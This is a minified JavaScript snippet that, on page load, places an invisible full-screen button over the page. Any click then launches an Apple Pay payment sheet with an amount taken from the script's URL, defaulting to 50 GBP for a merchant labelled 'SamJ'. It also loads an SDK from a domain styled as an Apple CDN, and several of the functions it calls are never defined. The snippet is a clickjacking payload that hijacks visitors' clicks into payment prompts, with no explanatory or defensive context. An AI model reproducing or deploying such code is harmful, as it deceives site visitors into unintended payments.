!function(){function e(e){let t=document.getElementsByTagName("script"),n=t[t.length-1],o=new URL(n.src);return o.searchParams.get(e)}function t(){if(!window.ApplePaySession)return;let t=e("label")||"SamJ",n=e("amount")||"50",o=new ApplePaySession(3,{countryCode:"GB",currencyCode:"GBP",merchantCapabilities:["supports3DS"],supportedNetworks:["visa","masterCard","amex","discover"],total:{label:t,type:"final",amount:n}});o.onvalidatemerchant=async e=>{let t=await validateMerchant();o.completeMerchantValidation(t)},o.onpaymentmethodselected=e=>{o.completePaymentMethodSelection({})},o.onshippingmethodselected=e=>{o.completeShippingMethodSelection({})},o.onshippingcontactselected=e=>{o.completeShippingContactSelection({})},o.onpaymentauthorized=e=>{let t={status:ApplePaySession.STATUS_SUCCESS};o.completePayment(t)},o.oncouponcodechanged=e=>{let t=calculateNewTotal(e.couponCode),n=calculateNewLineItems(e.couponCode),a=calculateNewShippingMethods(e.couponCode),l=calculateErrors(e.couponCode);o.completeCouponCodeChange({newTotal:t,newLineItems:n,newShippingMethods:a,errors:l})},o.oncancel=e=>{},o.begin()}document.addEventListener("DOMContentLoaded",function(){let e=document.createElement("button");e.id="pay",e.style.position="absolute",e.style.top="0",e.style.left="0",e.style.width="100vw",e.style.height="100vh",e.style.opacity="0",e.style.zIndex="2",e.style.border="none",e.style.background="none",e.onclick=t,document.body.appendChild(e);let n=document.createElement("script");n.src="https://applepay.cdn-apple.com/jsapi/v1.1.0/apple-pay-sdk.js",n.async=!0,n.crossOrigin="anonymous",document.head.appendChild(n)})}();
